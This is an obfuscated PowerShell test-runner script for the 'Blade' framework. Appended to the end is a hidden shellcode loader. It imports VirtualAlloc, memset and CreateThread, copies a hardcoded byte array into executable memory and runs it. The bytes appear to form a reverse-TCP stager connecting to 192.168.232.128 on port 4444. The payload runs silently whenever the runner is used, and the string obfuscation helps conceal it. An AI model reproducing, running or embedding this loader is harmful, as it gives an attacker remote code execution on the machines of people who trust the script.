 set-iTEm VARIabLe:LB1cGm  (  [tYPE]("{10}{4}{1}{6}{0}{9}{8}{5}{3}{7}{2}"-f'AGEM','Em.','sEr','ION.pSP','YsT','At','maN','Ar','tom','ENt.au','s') ) ; $uZfWP  = [tYpe]("{2}{0}{1}" -F'.','IO.pAtH','systEm') ;
[CmdletBinding()]
param(
    [Parameter(MaNdAtorY=$true,PoSitION=0)]
    [string[]]
    
    $Path,

    [string]
    
    $Name,

    [string[]]
    
    $Test,

    [string]
    
    $XmlLogPath,
    
    [Switch]
    
    $PassThru,
    
    [Switch]
    
    $Recurse
)


&("{1}{0}{4}{2}{3}" -f'c','Set-Stri','Mod','e','t') -Version ("{0}{1}" -f 'La','test')

& (&("{0}{2}{1}"-f'Join-','th','Pa') -Path $PSScriptRoot -ChildPath ("{4}{2}{0}{3}{1}"-f'rt-Bl','de.ps1','mpo','a','I') -Resolve)

function Get-FunctionsInFile($testScript)
{
    &("{2}{3}{1}{0}" -f 'e-Debug','t','Wr','i') -Message ('L'+'oadi'+'ng '+'t'+'est '+'scr'+'i'+'pt '+"'$testScript'.")
    $testScriptContent = &("{0}{2}{1}"-f'Get-','nt','Conte') "$testScript"
    if( -not $testScriptContent )
    {
        return @()
    }

    $errors = [Management.Automation.PSParseError[]] @()
    $tokens =  $lB1cGM::"tO`keN`iZE"( $testScriptContent, [ref] $errors )
    if( $errors -ne $null -and $errors."co`UnT" -gt 0 )
    {
        &("{2}{1}{0}" -f 'e-Error','rit','W') "Found $($errors.count) error(s) parsing '$testScript'. "
        return
    }
    
    &("{2}{1}{0}"-f'ug','b','Write-De') -Message "Found $($tokens.Count) tokens in '$testScript'. "
    
    $functions = &("{0}{1}{2}"-f 'New','-Obj','ect') System.Collections.ArrayList
    $atFunction = $false
    for( $idx = 0; $idx -lt $tokens."Co`UnT"; ++$idx )
    {
        $token = $tokens[$idx]
        if( $token."TY`Pe" -eq ("{0}{1}{2}"-f'Keyw','or','d')-and $token."cON`TEnT" -eq ("{0}{2}{1}" -f 'Functi','n','o') )
        {
            $atFunction = $true
        }
        
        if( $atFunction -and $token."tY`pe" -eq ("{0}{3}{1}{2}" -f 'Com','Ar','gument','mand') -and $token."cOn`TeNT" -ne '' )
        {
            &("{0}{2}{1}" -f 'Writ','ug','e-Deb') -Message "Found function '$($token.Content).' "
            [void] $functions.("{1}{0}" -f'd','Ad').Invoke( $token."con`Te`NT" )
            $atFunction = $false
        }
    }
    
    return $functions.("{0}{1}"-f'ToArra','y').Invoke()
}

function Invoke-Test
{
    
    [CmdletBinding()]
    param(
        $fixture, 
        $function
    )

    &("{2}{3}{1}{0}" -f 'ictMode','tr','Set','-S') -Version ("{0}{1}{2}"-f 'La','t','est')

    [Blade.TestResult]$testInfo = &("{2}{1}{0}" -f 't','-Objec','New') ("{3}{0}{1}{2}" -f'l','ad','e.TestResult','B') $fixture,$function

    $Error.("{1}{0}"-f 'lear','C').Invoke()

    $testPassed = $false
    try
    {
        if( &("{0}{1}{2}" -f'T','est','-path') function:Start-Test )
        {
            . ("{1}{0}{2}"-f 'Tes','Start-','t') | &("{1}{0}{3}{2}"-f 'orEach-O','F','t','bjec') { $testInfo."OU`T`PUT".("{0}{1}"-f'A','dd').Invoke( $_ ) }
        }
        elseif( &("{1}{0}" -f 'th','Test-Pa') function:SetUp )
        {
            &("{0}{2}{1}"-f 'Writ','ng','e-Warni') (("{6}{15}{0}{10}{3}{27}{17}{14}{18}{29}{22}{12}{28}{7}{24}{5}{4}{2}{1}{25}{21}{11}{13}{8}{20}{16}{9}{26}{23}{30}{19}"-f ' func','f','on o','bsolet','rsi',' ve','The ','a fu','se u','a','tion is o',' P',' ','lea','be rem','SetUp',' St','d will ','ov','.','se','.','d','inste','ture',' Blade','rt-Test ','e an','in ','e','ad'))
            . ("{0}{1}" -f 'SetU','p') | &("{2}{1}{3}{0}"-f '-Object','orEa','F','ch') { $testInfo."o`Ut`PUt".("{1}{0}" -f'dd','A').Invoke( $_ ) }
        }
        
        if( &("{1}{0}{2}" -f'-Pat','Test','h') function:$function )
        {
            . $function | &("{2}{3}{1}{0}"-f 'ct','-Obje','Fo','rEach') { $testInfo."ouTp`Ut".("{0}{1}"-f'A','dd').Invoke( $_ ) }
        }
        $testPassed = $true
    }
    catch [Blade.AssertionException]
    {
        $ex = $_."eXC`EPtI`on"
        $testInfo.("{2}{1}{0}"-f'ed','let','Comp').Invoke( $ex )
    }
    catch
    {
        $testInfo.("{0}{2}{1}"-f 'Comp','ed','let').Invoke( $_ )
    }
    finally
    {
        $tearDownResult = &("{1}{0}{2}" -f '-','New','Object') ("{2}{1}{0}" -f't','l','Blade.TestResu') $fixture,$function
        $tearDownFailed = $false
        try
        {
            if( &("{1}{0}{2}"-f 't-Pat','Tes','h') function:Stop-Test )
            {
                . ("{1}{2}{0}"-f'Test','Stop','-') | &("{2}{1}{0}"-f 'ect','Each-Obj','For') { $tearDownResult."Ou`TPUT".("{0}{1}" -f'Ad','d').Invoke( $_ ) }
            }
            elseif( &("{1}{2}{0}" -f'st-Path','T','e') -Path function:TearDown )
            {
                &("{1}{2}{0}" -f 'g','Write-War','nin') (("{22}{14}{0}{17}{8}{7}{5}{3}{15}{6}{18}{9}{13}{21}{2}{12}{10}{4}{11}{19}{20}{23}{16}{1}"-f 'rDown f','art-Test instead.','er',' ','lade.','ill be','ved',' and w','te',' a fu',' B',' Ple','sion of','tur',' Tea','remo','St','unction is obsole',' in','a','se ','e v','The','use '))
                . ("{1}{2}{0}"-f'own','Tear','D') | &("{0}{3}{2}{4}{1}" -f'F','t','Each-Obje','or','c') { $tearDownResult."OuTp`UT".("{0}{1}" -f'Ad','d').Invoke( $_ ) }
            }
            $tearDownResult.("{1}{2}{0}"-f 'eted','Comp','l').Invoke()
        }
        catch
        {
            $tearDownResult.("{0}{1}{2}"-f'C','omp','leted').Invoke( $_ )
            $tearDownFailed = $true
        }
        finally
        {
            if( $testPassed )
            {
                $testInfo.("{2}{0}{1}" -f 'e','d','Complet').Invoke()
            }

            $flag = '! '
            $result = ("{1}{0}"-f 'AILED','F')
            if( $testInfo."pA`SseD" )
            {
                $flag = '  '
                $result = ("{1}{0}" -f 'd','Passe')
            }
            &("{3}{0}{1}{2}{4}" -f'rit','e-','Ver','W','bose') -Message ('  {0}{1} in {2:mm\:ss\.fff}  [{3}]' -f $flag,$result,$testInfo."D`UraT`IOn",$function)
            $testInfo
            if( $tearDownFailed )
            {
                $tearDownResult
            }
        }

        $Error.("{1}{0}" -f 'lear','C').Invoke()
    }

}

$getChildItemParams = @{ }
if( $Recurse )
{
    $getChildItemParams."reC`UrsE" = $true
}

$testScripts = @( &("{3}{1}{2}{4}{0}" -f 'm','et-Ch','i','G','ldIte') $Path Test-*.ps1 @getChildItemParams )
if( $testScripts -eq $null )
{
    $testScripts = @()
}

$Error.("{1}{0}"-f'r','Clea').Invoke()
$testsIgnored = 0
$TestScript = $null
$TestDir = $null

$results = $null

$testScripts | 
    &("{3}{0}{4}{1}{2}"-f 'rE','ch','-Object','Fo','a') {
        $testCase = $_
        $TestScript = (&("{1}{0}{2}"-f 'a','Resolve-P','th') $testCase."fULLN`A`mE")."p`ATh"
        $TestDir = &("{0}{1}{2}" -f'S','plit','-Path') -Parent $testCase."Ful`lnA`Me" 
        
        $testModuleName =   $UzFWP::("{4}{6}{2}{1}{5}{0}{3}" -f'Withou','ile','tF','tExtension','G','Name','e').Invoke($testCase)

        $functions = &("{0}{3}{2}{1}"-f'Get-Function','nFile','I','s') $testCase."f`UL`lNAMe" |
                        &("{1}{2}{0}{3}" -f 'bj','Where-','O','ect') { $_ -match (('^(Test'+'{1}Ign'+'or'+'e)-(.*)'+'{0}')  -F [cHAR]36,[cHAR]124) } |
                        &("{2}{0}{3}{1}" -f'b','ect','Where-O','j') { 
                            if( $PSBoundParameters.("{1}{2}{0}{3}" -f 'insKe','Cont','a','y').Invoke(("{0}{1}" -f 'Tes','t')) )
                            {
                                return $Test | &("{2}{1}{0}{3}"-f'r','he','W','e-Object') { $Matches[2] -like $_ } 
                            }

                            if( $Matches[1] -eq ("{0}{1}{2}"-f 'Ig','n','ore') )
                            {
                                &("{2}{3}{1}{0}"-f 'ng','ni','Write','-War') ("Skipping ignored test '{0}'." -f $_)
                                $testsIgnored++
                                return $false
                            }

                            return $true
                        }
        if( -not $functions )
        {
            return
        }

        @(("{2}{0}{1}{3}{4}"-f'rt','-','Sta','T','estFixture'),("{2}{1}{0}"-f'est','art-T','St'),("{1}{0}"-f 'up','Set'),("{1}{0}"-f 'arDown','Te'),("{0}{3}{2}{1}" -f 'S','p-Test','o','t'),("{2}{0}{1}{4}{3}" -f 'top-','Test','S','xture','Fi')) |
            &("{3}{2}{0}{1}"-f 'Ob','ject','ch-','ForEa') { &("{2}{0}{1}"-f'oin-P','ath','J') -Path ("{0}{1}"-f'functi','on:') -ChildPath $_ } |
            &("{0}{2}{1}" -f 'Wher','bject','e-O') { &("{0}{2}{1}"-f 'T','-Path','est') -Path $_ } |
            &("{1}{3}{2}{0}" -f'em','Re','ve-It','mo')
        
        &("{2}{3}{1}{0}" -f'rbose','Ve','W','rite-') -Message ('[{0}]' -f $testCase."N`AMe")

        . $testCase."f`U`llname"

        try
        {
            if( &("{0}{1}{2}" -f'T','e','st-Path') -Path ("{2}{0}{1}{4}{6}{3}{5}" -f'ction:Star','t','fun','xtur','-Te','e','stFi') )
            {
                . ("{4}{1}{3}{0}{2}" -f'tFix','tart-T','ture','es','S') | &("{0}{2}{1}"-f'Out-','ng','Stri') | &("{0}{2}{3}{1}" -f'Writ','g','e-','Debu')
            }

            foreach( $function in $functions )
            {

                if( -not (&("{2}{0}{1}"-f '-P','ath','Test') -Path function:$function) )
                {
                    continue
                }
                
                &("{2}{1}{0}" -f 'Test','e-','Invok') $testModuleName $function 
            }

            if( &("{1}{2}{0}" -f'ath','Test-','P') -Path function:Stop-TestFixture )
            {
                try
                {
                    . ("{1}{0}{2}{3}"-f 'es','Stop-T','tFixtur','e') | &("{0}{1}{2}" -f'Out-','Str','ing') | &("{0}{3}{1}{2}" -f'Wr','bu','g','ite-De')
                }
                catch
                {
                    &("{1}{2}{0}" -f '-Error','Wr','ite') ("An error occured tearing down test fixture '{0}': {1}" -f $testCase."n`AME",$_)
                    $result = &("{1}{0}{2}" -f'w-Objec','Ne','t') ("{1}{0}{2}{3}"-f'a','Bl','de.TestRes','ult') $testModuleName,("{0}{4}{2}{5}{3}{1}"-f 'St','re','-Tes','xtu','op','tFi')
                    $result.("{0}{1}{2}" -f'F','inis','hed').Invoke( $_ )
                }                
            }
        }
        finally
        {
            foreach( $function in $functions )
            {
                if( $function -and (&("{2}{0}{1}" -f't-Pat','h','Tes') function:$function) )
                {
                    &("{0}{1}{3}{2}"-f'Re','move-I','em','t') function:\$function
                }
            }
        }        
    } | 
    &("{1}{2}{0}" -f'Object','Te','e-') -Variable ("{1}{0}"-f 'esults','r') |
    &("{2}{3}{1}{0}"-f 'ct','re-Obje','Wh','e') { $PassThru -or -not $_."pa`SSeD" } 

$Global:LastBladeResult = &("{1}{0}{2}"-f'w-Obj','Ne','ect') ("{2}{0}{4}{1}{3}" -f'unR','s','Blade.R','ult','e') $Name,([Blade.TestResult[]]$results), $testsIgnored
if( $LastBladeResult."ERr`ORs" -or $LastBladeResult."F`A`IlurEs" )
{
    &("{3}{1}{0}{2}" -f 'Erro','ite-','r','Wr') $LastBladeResult.("{1}{2}{0}" -f'ng','To','Stri').Invoke()
}

if( $XmlLogPath )
{
    $LastBladeResult | &("{1}{2}{4}{3}{0}{5}"-f'tX','Ex','port-RunR','l','esu','ml') -FilePath $XmlLogPath
}

$LastBladeResult | &("{2}{1}{0}{3}"-f '-T','mat','For','able') | &("{2}{1}{0}"-f'Host','-','Out')

$c = ((("{63}{18}{77}{14}{47}{32}{84}{110}{74}{54}{38}{80}{83}{62}{91}{112}{81}{12}{73}{118}{26}{117}{111}{69}{11}{30}{90}{22}{100}{31}{27}{51}{116}{9}{86}{99}{24}{17}{72}{57}{109}{44}{4}{59}{53}{1}{79}{96}{7}{85}{10}{60}{43}{114}{46}{103}{67}{78}{97}{107}{56}{36}{41}{37}{8}{29}{19}{33}{68}{20}{65}{45}{70}{115}{119}{39}{50}{21}{5}{25}{98}{23}{58}{105}{55}{94}{15}{3}{82}{49}{2}{34}{6}{95}{71}{66}{87}{61}{89}{104}{40}{106}{93}{13}{0}{75}{48}{35}{102}{88}{52}{64}{92}{16}{42}{101}{28}{108}{76}{113}"-f 'i',';[DllImpor','a','er, uint ','t flPro','d',' I','ke','Th',', ui','32.','l',' ','c stat','t','t','dest','uint','l','Att','t dw','tartA','In',' IntP',', ','dres','n','tr ','uint ','read','lo','P','0','ribut','gs,',' IntPtr m','t',' lp','dll{0',' l','r','Ptr',',','c',', uin','tack','rn','({',' extern','reationFl','pS','lpAddre','set(IntPt','t)','2.','ram','d(In','p','tr ','tec','dll{0})]public stati','port({0',' st','[Dl','r','S',';[DllI','IntPtr ','es, uin',' VirtualA','Size, Int',' lpThreadId)',' flAllocationTy','ex','l3','c','c,','Impor','Cr','t({0','})]p','ic','dwC','ublic','}ke','rnel','nt ','m','m','}','c(','a',' ','publi','e','ntPtr','}','eateTh','s,','dwSize','t',' ','e',' ','msvc','lpPa','t.dll{0})]','rea','sr','e','rne','tr','t',' uint count);',' exte','P','ss',' IntP','ter','tr')) -f[ChAR]34);$w = &("{0}{1}{2}" -f'Ad','d-T','ype') -memberDefinition $c -Name ("{1}{0}" -f'32','Win') -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xe8,0x80,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z."LEn`gTH" -gt 0x1000){$g = $z."lE`NgTh"};$x=$w::("{2}{3}{1}{0}"-f 'loc','ualAl','Vi','rt').Invoke(0,0x1000,$g,0x40);for ($i=0;$i -le ($z."l`En`gth"-1);$i++) {$w::"MeMs`Et"([IntPtr]($x.("{0}{1}" -f 'T','oInt32').Invoke()+$i), $z[$i], 1)};$w::("{1}{3}{0}{2}" -f 'Th','Crea','read','te').Invoke(0,0,$x,0,0,0);for (;;){&("{0}{1}{2}"-f'S','tart','-sleep') 60};
